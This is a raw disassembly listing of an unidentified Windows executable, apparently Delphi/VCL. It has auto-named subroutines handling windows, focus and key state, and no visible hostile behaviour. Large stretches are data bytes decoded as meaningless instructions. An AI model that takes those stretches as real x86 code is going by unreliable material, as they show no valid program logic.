mov eax [ r-xdata ]
call sub_413230
mov eax [ r-xdata ]
call sub_4132d0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41327c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41327c
mov eax [ r-xdata ]
call sub_413174
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_422a68
mov [ rw-data ] eax
sub_449514
cld
rol [ eax + eax + 0x10 ] 0xc1
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ 0x676e6152 ] al
add [ gs : eax ] dl
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
push ebx
insd
outsd
outsd
je r-xdata
add [ eax ] al
[ 0x1ff0000 ]
cmp al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
push [ eax - 0x40 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
mov ah 0xc0
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
add eax 0x6c797453
cmp al 0x10
inc eax
add [ eax ] bh
add [ eax ] al
dec esp
rol [ eax + eax + 0x1 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or [ eax + ebp * 2 + 0x75 ] edx
insd
bound edx [ ebx + 0x69 ]
jpe r-xdata
add [ ebx + esi ] dh
inc eax
add [ eax + 0x3c00419d ] ah
xor eax [ eax ]
or [ esi + 0x30900043 ] cl
inc eax
add [ eax + esi - 0x3c3fffc0 ] ch
inc esp
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al bh
xchg ebp eax
inc esp
add [ eax ] cl
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add [ eax ] dl
inc eax
add [ 0x1dff0000 ] bl
add [ eax ] al
inc [ ecx ]
inc ecx
add [ ebx + ebp * 2 + 0x43 ] ah
add [ eax + 0x3f ] ah
mov ebp 0x85d00043
inc ebx
add [ eax + eax * 2 ] ch
dec esi
outsd
jb r-xdata
add [ eax - 0x2fffbc43 ] ch
test [ ebx ] eax
sub al 0x40
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
inc ebx
add [ edx + esi * 2 + 0x48780043 ] al
inc ebx
add [ esp + 0x41 ] ah
pushad
aas
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
add [ ecx + 0x41 ] cl
add [ ecx + 0x41 ] al
add [ esp + 0x41 ] ch
add [ eax - 0x3d ] cl
inc esp
add [ eax + edi * 4 - 0x4227ffbd ] bh
inc ebx
add [ edi * 4 + 0x3dd40043 ] ah
inc ebx
add [ eax ] bh
mov bl 0x43
add [ eax - 0x4d ] bl
inc ebx
add [ eax - 0x50 ] dh
inc ebx
add [ edi + 0x3d200043 ] bl
inc ebx
add [ ebp * 2 + 0x6d600043 ] dh
inc ebx
add [ eax + 0x48 ] ah
inc ebx
add [ eax - 0x13ffbcc2 ] bl
dec ecx
inc ebx
add [ ecx + ecx * 2 + 0x43 ] ah
add [ eax + 0x4c ] bh
inc ebx
add [ ebx + ecx * 2 ] ah
inc ebx
add [ esp + ecx * 4 + 0x6de40043 ] ah
inc ebx
add ah al
mov al 0x43
add [ eax + 0x7c0043b1 ] al
lodsb [ esi ]
inc ebx
add [ ecx + esi * 4 + 0x43 ] ah
add [ eax - 0x36 ] bh
inc esp
add [ esp + eax * 8 + 0x44 ] cl
add [ eax ] dh
xchg [ ebx ] eax
cld
retn
inc ecx
jae r-xdata
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
sbb al 0xc1
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add ah bh
xchg ebp eax
inc esp
add [ ebx ] al
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
ror [ esi + edx * 4 + 0x44 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4497 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x69 ] ah
inc esp
add [ esi + 0x1c004497 ] al
add al [ eax ]
add [ eax + 0xe ] bh
inc ebx
add [ esp + 0x41 ] cl
sub_44a6e5
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor eax 0x63530600
popad
insb
add [ fs : eax ] dl
inc eax
add dl ah
add al [ eax ]
jmp edx
sub_44a795
mov esp 0x240044d9
imul eax [ ebx ] 0x0
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0x3c656c62
adc [ eax ] al
dec eax
add [ eax ] al
dec [ edx + eax * 2 + 0x43 ]
add ah al
salc
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050004 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
sub eax [ edx ]
add bh bh
mov ah 0xea
inc esp
add [ eax ] cl
out 0x44 al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp al [ eax ]
or edx [ edi + 0x69 ]
outsb
outsd
ja r-xdata
add [ eax ] al
inc eax
add [ eax ] al
je r-xdata
jne r-xdata
jpe r-xdata
popad
outsb
push edx
jae r-xdata
add [ eax ] al
cmp [ 0x6e4f0b00 ] 0x43
je r-xdata
or dh ah
inc esp
jb r-xdata
push ecx
hlt
outsb
inc ebx
dec edi
cmp [ ecx ] dh
inc esp
add [ eax + 0x2 ] bl
add bh bh
pop eax
out 0x44 eax
add [ eax ] cl
out 0x44 al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x570a003b ] al
imul ebp [ esi + 0x64 ] 0x654d776f
outsb
add [ edi + ecx * 2 ] cl
popad
je r-xdata
hlt
enter 0x4305 0x0
enter 0x0 0xff
enter 0x0 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ecx
add [ ebx ] dl
dec edi
outsb
inc ebx
outsd
outsb
jae r-xdata
or dl [ edi + 0x69 ]
outsb
outsd
ja r-xdata
cmovno eax [ eax ]
mov [ edx ] al
add bh bh
mov [ edx ] al
add bh bh
or dh ah
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003c ] al
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
dec edi
sbb al 0x3
inc ebx
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0047 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
outsb
inc esp
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
hlt
outsb
jb r-xdata
hlt
jne r-xdata
outsb
inc ebx
insb
outsd
jae r-xdata
dec [ eax ]
out 0x44 al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003d ] al
pop eax
add eax 0xc00043
add bh bh
rol [ eax ] 0x0
add [ eax ] 0x0
add [ eax + 0x4f0d004c ] al
outsb
inc edi
je r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
sbb [ edx ] al
inc ebx
add al ch
add [ eax ] al
jb r-xdata
dec [ eax ]
out 0x44 al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0044 ] al
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ esi ] cl
dec edi
outsb
inc ebx
mov [ ebx + 0x2980044 ] bl
add bh bh
cwde
add al [ eax ]
dec [ eax ]
out 0x44 al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0040 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
add bh bh
or dh ah
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09004f ] al
outsb
dec ebx
jns r-xdata
imul esi [ ebp + 0x49 ] 0xf46f666e
cmovno eax [ eax ]
mov al 0x2
add bh bh
mov al 0x2
add bh bh
or dh ah
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06004d ] al
outsb
outsw
hlt
jo r-xdata
outsb
inc esp
jb r-xdata
dec [ eax ]
out 0x44 al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0049 ] al
add al [ ebx ]
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec ebx
add [ ecx ] cl
dec edi
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
fadd [ edx ]
add bh bh
fadd [ edx ]
add bh bh
or dh ah
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
or cl [ edi + 0x6e ]
add eax [ ebx ]
mov eax 0xb8ff0001
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0048 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
jns r-xdata
add [ eax + 0x4f090045 ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080043 ] al
outsb
inc ebx
jb r-xdata
add al [ eax ]
dec [ eax ]
out 0x44 al
push ecx
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ ebx ] eax
[ eax ] al
push eax
add [ eax ] al
dec [ eax ]
out 0x44 al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a004a ] al
outsb
inc esp
jb r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x34 ] bp
add al 0x43
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi + 0x6e ] ecx
jb r-xdata
outsb
inc esp
jae r-xdata
add [ ecx ] cl
dec edi
cmovno eax [ eax ]
mov al [ 0xffffffffa0ff0002 ]
add al [ eax ]
dec [ eax ]
add [ eax - 0x5f00fffe ] ah
push eax
outsd
jo r-xdata
loopne r-xdata
jo r-xdata
add [ ebx ] al
push esp
add [ ebx ] eax
loopne r-xdata
outsb
dec eax
imul esp [ ebp + 0x8 ] 0xa800449c
add al [ eax ]
[ eax + 0x1ff0002 ]
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
jbe r-xdata
add [ edx ] cl
add al [ ebx ]
call 0xffffffffe943aa0d
add [ eax ] al
out 0x44 al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0046 ] al
mov al [ 0x8ff0002 ]
jo r-xdata
add bh bh
or dh ah
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090054 ] al
outsb
dec ebp
outsd
jne r-xdata
add [ ebx ] al
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
or dh ah
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0052 ] al
outsb
dec ebp
outsd
jne r-xdata
push 0x446c6565
outsd
ja r-xdata
dec ebp
outsd
jbe r-xdata
jmp eax
add bh bh
loopne r-xdata
dec ebp
add [ esi ] al
dec edi
outsd
outsb
je r-xdata
cmovno eax [ eax ]
rol [ edx ] 0x1
add bh bh
rol [ edx ] 0x1
add bh bh
outsd
jne r-xdata
push ebp
jo r-xdata
insb
loopne r-xdata
inc esp
outsd
ja r-xdata
int3
loopne r-xdata
adc [ edi + 0x6e ] cl
sub al 0x0
inc ebx
add al ah
dec [ eax ]
out 0x44 al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0050 ] al
outsb
dec ebx
jns r-xdata
add bh bh
or dh ah
inc esp
cmovno eax [ eax ]
enter 0x2 0xff
enter 0x2 0xff
or dh ah
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06005b ] al
outsb
push ebx
push 0x480776f
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b005c ] al
outsb
push ebx
je r-xdata
push edi
push 0x556c6565
jo r-xdata
dec [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push edi
add [ esi ] cl
dec edi
push es
inc ebx
add [ eax ] bh
add [ eax ] eax
dec ebp
outsd
jne r-xdata
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f100056 ] al
outsb
inc ebx
add [ eax + 0x1 ] al
add bh bh
movsb [ edi ] [ esi ]
outsb
dec ebp
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0057 ] al
inc ebx
add [ eax + 0x1 ] cl
add bh bh
jae r-xdata
push edi
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
or dh ah
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0053 ] al
jb r-xdata
inc esp
add [ ebx + esi ] bh
inc eax
add [ ebx + esi * 8 ] ah
inc esp
add [ eax - 0x53ffbfd0 ] dl
xor [ eax ] al
and bh cl
inc esp
jb r-xdata
cmovno eax [ eax ]
mov eax 0xb8ff0002
add al [ eax ]
dec [ eax ]
out 0x44 al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070058 ] al
outsb
push eax
popad
imul ebp [ esi + 0x74 ] r-xdata
clc
add [ eax ] al
je r-xdata
jpe r-xdata
outsb
dec ebp
outsd
jne r-xdata
dec edi
jae r-xdata
add [ eax - 0x6fffbc43 ] ch
aam 0x44
add [ eax + eax * 2 ] ch
inc ecx
add [ ecx + ebx - 0x2ee3ffbb ] al
inc esp
add [ eax ] ch
rol [ eax + eax + 0x78 ] cl
dec eax
inc ebx
add [ esp + 0x41 ] ah
add [ eax + 0x440044da ] ah
mov eax [ 0x16400041 ]
inc ebp
add [ eax ] bl
sbb [ ebp ] al
mov esp 0xd80043b8
mov ebp 0xbd240043
inc ebx
add ah dl
cmp eax 0xb3380043
inc ebx
add [ eax + 0x700044d7 ] al
mov al 0x43
add [ edi + 0x3d200043 ] bl
inc ebx
add [ eax + ebx * 8 + 0x44 ] dh
add [ eax + 0x6d ] ah
inc ebx
add [ eax + 0x48 ] ah
inc ebx
add [ eax - 0x13ffbcc2 ] bl
dec ecx
inc ebx
add [ eax - 0x26 ] ch
inc esp
add [ ecx + ebx * 8 ] dh
inc esp
add [ ebx + ecx * 2 ] ah
inc ebx
add al ah
fiadd [ eax + eax - 0x1c ]
insd
inc ebx
add ah al
mov al 0x43
add [ eax + 0x7c0043b1 ] al
lodsb [ esi ]
inc ebx
add [ ecx + esi * 4 + 0x43 ] ah
add [ eax - 0x36 ] bh
inc esp
add [ ecx - 0x78cfffbc ] al
inc ebx
add [ eax - 0x12 ] cl
inc esp
add [ eax + 0x640044f1 ] ch
inc esp
inc esp
add [ eax - 0x7ffbb52 ] al
add al [ eax ]
add [ esp + ebx * 4 + 0x44 ] ah
add [ esp + 0x41 ] cl
add [ ecx * 8 - 0x3147ffbc ] al
dec eax
scasb [ edi ]
outsd
arpl [ ebx + 0x14 ] bp
add al 0x43
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08005d ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
rcl [ ebp + ebp * 4 + 0x44 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
scasb [ edi ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x52 ] cl
popad
add [ eax ] al
jmp eax
or [ ecx ] al
inc ebx
add al ch
add [ eax ] eax
sub_44b284
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_44b2d0
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_4549d0
mov eax [ rw-data ]
call sub_419f7c
mov eax [ rw-data ]
call sub_419f24
retn
push 0x0
push eax
call ShowOwnedPopups
sub_44b308
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_4026cc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_44b358
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_44b3fb
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_403580#9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_44b308
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b402
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_44b40c
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_4026ec
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_44b444
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_44b4a8
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_44b444
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_44b504
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_44b524
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_44b504
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_44b550
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_451fb0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_452420
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407a60
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_451f9c
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45240c
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407a60
test eax eax
je r-xdata
sub_44b5d0
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_44b624
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_44b660
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_44b6ac
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44b70a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4490ac
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_40409c
mov eax [ ebp - 0x8 ]
pop edx
call sub_407a60
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b711
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ed8
retn
sub_44b71c
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_44b744
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_44b7b5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_44b71c
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b7bc
lea eax [ ebp - 0xc ]
call sub_403eb4
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b368
call sub_40386c
sub_44b7c4
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030c8
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_44b854
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41402c
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_44c11c
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_44c0fc
mov edx [ edi + 0xc ]
mov eax ebx
call sub_44bfac
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44b8a4
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_44ba5c
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_43511c
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_44bfac
xor edx edx
mov eax ebx
call sub_44bfac
jmp r-xdata
sub_44b8dc
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4225b0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_44b948
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4225b0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_44b9b0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_44c0e4
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_437fc0
mov ebx eax
